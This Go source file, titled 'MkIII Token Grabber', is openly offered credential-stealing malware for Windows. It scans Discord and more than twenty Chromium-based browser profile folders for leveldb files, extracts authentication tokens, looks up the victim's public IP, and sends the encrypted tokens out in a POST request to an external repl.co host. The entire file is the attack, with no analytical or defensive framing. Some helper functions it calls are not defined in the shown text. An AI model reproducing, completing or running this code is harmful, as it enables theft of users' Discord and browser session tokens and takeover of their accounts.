/* This package is to be compiled for Win32 or Win64 based Systems.

MkIII Token Grabber
(c) 2021 Studio 7 Development

> Go Implementation
*/

package main

import (
	"bytes"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"strconv"
	"strings"
	"sync"
)

func DumpService() []string {
	var USER string = GetUsername()

	var LOCAL string = "C:\\Users\\" + USER + "\\AppData\\Local"
	var ROAMING string = "C:\\Users\\" + USER + "\\AppData\\Roaming"

	var WG sync.WaitGroup

	var T []string

	PLATFORMS := [27]string{
		ROAMING + "\\discord",
		ROAMING + "\\discordcanary",
		ROAMING + "\\discordptb",
		LOCAL + "\\Google\\Chrome\\User Data\\Default",
		ROAMING + "\\Opera Software\\Opera Stable",
		ROAMING + "\\Opera Software\\Opera GX Stable",
		LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
		LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Default",
		LOCAL + "\\Chromium\\User Data\\Default",
		LOCAL + "\\Epic Privacy Browser\\User Data\\Default",
		LOCAL + "\\Amigo\\User Data\\Default",
		LOCAL + "\\Vivaldi\\User Data\\Default",
		LOCAL + "\\Orbitum\\User Data\\Default",
		LOCAL + "\\Mail.Ru\\Atom\\User Data\\Default",
		LOCAL + "\\Kometa\\User Data\\Default",
		LOCAL + "\\Comodo\\Dragon\\User Data\\Default",
		LOCAL + "\\Torch\\User Data\\Default",
		LOCAL + "\\Comodo\\User Data\\Default",
		LOCAL + "\\Slimjet\\User Data\\Default",
		LOCAL + "\\360Browser\\Browser\\User Data\\Default",
		LOCAL + "\\Maxthon3\\User Data\\Default",
		LOCAL + "\\K-Melon\\User Data\\Default",
		LOCAL + "\\Sputnik\\Sputnik\\User Data\\Default",
		LOCAL + "\\Nichrome\\User Data\\Default",
		LOCAL + "\\CocCoc\\Browser\\User Data\\Default",
		LOCAL + "\\uCozMedia\\Uran\\User Data\\Default",
		LOCAL + "\\Chromodo\\User Data\\Default",
	}

	for _, PLATFORM := range PLATFORMS {
		if _, err := os.Stat(PLATFORM); os.IsNotExist(err) {
			continue
		}

		PLATFORM_PATH := PLATFORM + "\\Local Storage\\leveldb\\"
		items, _ := ioutil.ReadDir(PLATFORM_PATH)
		for _, File := range items {
			FName := File.Name()
			var t []string
			if File.IsDir() || (!strings.HasSuffix(FName, ".log") && !strings.HasSuffix(FName, ".ldb")) {
				continue
			}

			// Do stuff here
			WG.Add(1)
			go func(FName string) {
				defer WG.Done()

				b, e := os.ReadFile(PLATFORM_PATH + FName)
				if e != nil {
					log.Fatalf(e.Error())
				}

				t = FindAll(string(b))

				if len(t) > 0 {
					T = append(T, t...)
				}
			}(FName)
		}
		WG.Wait()
	}
	return T
}

func ToString(s interface{}) string {
	return fmt.Sprint(s)
}

func main() {
	resp, _ := http.Get("https://myexternalip.com/raw")
	defer resp.Body.Close()
	body, _ := ioutil.ReadAll(resp.Body)

	// Log the request body
	ip := string(body)
	HashKey := RandIntBytes(3)
	HashKeyInt, _ := strconv.Atoi(HashKey)

	GenerateHeaders()

	hash, nonce := CryptSign(ip, HashKey)

	HEADERS[HashKeyInt] = nonce

	//fmt.Println(HEADERS)

	var p string = "{"

	for i := 0; i < 999; i++ {
		if i == 998 {
			p = p + "\"" + fmt.Sprintf("%03d", i) + "\":\"" + HEADERS[i] + "\""
			continue
		}
		p = p + "\"" + fmt.Sprintf("%03d", i) + "\":\"" + HEADERS[i] + "\","

	}
	p = p + "}"

	T := strings.Join(DumpService(), "%BREAK%")
	var t string
	if len(T) < 16 {
		t = strings.ReplaceAll(strings.ReplaceAll(fmt.Sprintf("% 16d", T), "%!d(string=", ""), ")", "")
	} else {
		t = T
	}

	endpoint := Encrypt(t, strings.Join(strings.Split(hash, "")[0:32], ""))
	req, _ := http.NewRequest("POST", "https://liveton.studio7.repl.co/go/"+fmt.Sprintf("%03d", len(ToString(endpoint)))+strings.TrimRight(ToString(endpoint), "0")+HashKey, bytes.NewBuffer([]byte(p)))
	req.Header.Set("Content-Type", "application/json")

	client := &http.Client{}
	client.Do(req)

}
